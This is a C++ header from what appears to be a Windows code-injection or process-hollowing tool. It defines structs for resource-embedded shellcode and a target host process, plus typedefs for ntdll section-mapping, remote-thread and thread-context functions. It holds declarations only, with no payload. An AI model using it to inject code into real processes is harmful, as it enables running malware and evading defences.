#pragma once

#include <iostream>
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll")

#define SECTION_SIZE 0x1000

typedef struct {
    HRSRC shellcodeResource;
    SIZE_T shellcodeSize;
    BYTE* shellcode;
} SHELLCODE;

typedef struct {
    HANDLE processHandle;
    DWORD imageBaseAddress;
    DWORD entryPoint;
} HOST;

#if !defined NTSTATUS
typedef LONG NTSTATUS;
#endif

#define STATUS_SUCCESS 0

typedef CLIENT_ID* PCLIENT_ID;

using myNtCreateSection = NTSTATUS(NTAPI*)(
    OUT PHANDLE SectionHandle,
    IN ULONG DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG PageAttributess,
    IN ULONG SectionAttributes,
    IN HANDLE FileHandle OPTIONAL
    );

using myNtOpenSection = NTSTATUS(NTAPI*)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );

using myNtMapViewOfSection = NTSTATUS(NTAPI*)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );

using myRtlCreateUserThread = NTSTATUS(NTAPI*)(
    IN HANDLE ProcessHandle,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN BOOLEAN CreateSuspended,
    IN ULONG StackZeroBits,
    IN OUT PULONG StackReserved,
    IN OUT PULONG StackCommit,
    IN PVOID StartAddress,
    IN PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientID
    );

using myZwUnmapViewOfSection = NTSTATUS(NTAPI*)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress
    );

using myNtGetContextThread = NTSTATUS(NTAPI*) (
    IN HANDLE ThreadHandle,
    OUT PCONTEXT Context
    );

using myNtSetContextThread = NTSTATUS(NTAPI*) (
    IN HANDLE ThreadHandle,
    IN PCONTEXT Context
    );
